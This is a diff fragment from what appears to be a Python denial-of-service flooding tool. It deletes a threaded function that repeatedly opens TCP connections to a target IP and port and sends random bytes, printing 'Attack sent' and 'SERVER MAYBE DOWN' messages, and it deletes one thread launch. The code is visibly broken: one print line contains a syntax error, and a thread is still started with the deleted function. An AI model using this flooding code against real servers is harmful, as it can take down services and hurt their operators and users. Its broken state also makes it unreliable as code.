@@ -112,22 +112,7 @@ def run3():
 			
             
   
-def run4():
-	data = random._urandom(16)
-	i = random.choice(("[*]","[?]","[!]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-		        print(i ?"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
-		except:
-			s.close()
-			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
-				
-											
+							
             
 for y in range(threads):
 	if choice == 'y':
@@ -135,8 +120,7 @@ for y in range(threads):
 		th.start()
 		th = threading.Thread(target = run2)
 		th.start()
-		th = threading.Thread(target = run3)
-		th.start()
+		
 else:
 		th = threading.Thread(target = run4)
 		th.start()
